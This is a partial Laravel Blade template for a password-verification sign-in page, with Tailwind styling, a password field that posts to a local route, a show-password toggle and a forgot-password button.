...
<body>
    <div class="border border-gray-200 mx-auto size rounded-lg mt-20">
        <div class="flex justify-center mt-8">
            <img class="select-none" src="{{ asset('images/logoo.png') }}" width="90" height="60"
                alt="">
        </div>
        <h1 class="text-center text-2xl font h1font">Welcome</h1>
        ...
        <h1 class=" mx-10 mt-6 robotono">To continue, first verify that it's you
        </h1>
        <div class="mx-10">
            <div class="w-full mt-8">
                <form action="{{ route('secondhome') }}" method="POST">
                    @csrf
                    <input
                        ...
                        type="password" placeholder="Enter your password" id="myInput" name="password">

            </div>
            <div class="flex">
                <input class="w-4 h-4 rounded-lg mt-2 ml-1" type="checkbox" name="checkbox" onclick="myFunction()">
                <h1 class="ml-4 mt-2 roboto4003 font-normal">Show password</h1>
            </div>
        </div>
        <div class="mx-10 mt-8">
            <div>
                <button
                    class="roboto5003 text-blue-500 font-medium p-1 py-2 rounded hover:bg-gray-100 select-none">Forgot
                    password?</button>
                <button
